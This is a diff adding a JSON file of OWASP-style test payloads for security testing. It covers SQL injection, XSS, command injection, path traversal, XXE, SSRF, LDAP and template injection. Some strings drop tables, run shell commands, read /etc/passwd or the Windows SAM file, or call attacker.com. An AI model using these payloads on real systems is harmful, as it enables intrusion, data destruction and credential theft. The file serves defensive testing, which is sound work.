@@ -1,0 +1,90 @@
+{
+  "description": "OWASP Test Vectors for Security Testing",
+  "warning": "These payloads are INTENTIONAL - for testing security controls only",
+  "categories": {
+    "sql_injection": {
+      "description": "SQL Injection test payloads",
+      "payloads": [
+        "' OR '1'='1",
+        "'; DROP TABLE users--",
+        "1' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--",
+        "1; EXEC xp_cmdshell('whoami')--",
+        "' WAITFOR DELAY '0:0:5'--",
+        "1' AND (SELECT LOAD_FILE('/etc/passwd'))--"
+      ]
+    },
+    "xss": {
+      "description": "Cross-Site Scripting test payloads",
+      "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "<body onload=alert('XSS')>",
+        "'-alert('XSS')-'"
+      ]
+    },
+    "command_injection": {
+      "description": "OS Command Injection test payloads",
+      "payloads": [
+        "; ls -la",
+        "| cat /etc/passwd",
+        "&& whoami",
+        "$(id)",
+        "`uname -a`",
+        "|| ping -c 10 attacker.com"
+      ]
+    },
+    "path_traversal": {
+      "description": "Directory Traversal test payloads",
+      "payloads": [
+        "../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "/etc/passwd%00.jpg",
+        "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
+      ]
+    },
+    "xxe": {
+      "description": "XML External Entity test payloads",
+      "payloads": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]>"
+      ]
+    },
+    "ssrf": {
+      "description": "Server-Side Request Forgery test payloads",
+      "payloads": [
+        "http://127.0.0.1:22",
+        "http://localhost:6379",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://[::1]:80",
+        "file:///etc/passwd",
+        "gopher://localhost:6379/_INFO"
+      ]
+    },
+    "ldap_injection": {
+      "description": "LDAP Injection test payloads",
+      "payloads": [
+        "*)(uid=*))(|(uid=*",
+        "admin)(&)",
+        "*)(objectClass=*",
+        "x)(|(cn=*",
+        "admin)(!(&(1=0"
+      ]
+    },
+    "ssti": {
+      "description": "Server-Side Template Injection test payloads",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "${{7*7}}",
+        "{{constructor.constructor('return this')()}}"
+      ]
+    }
+  }
+}
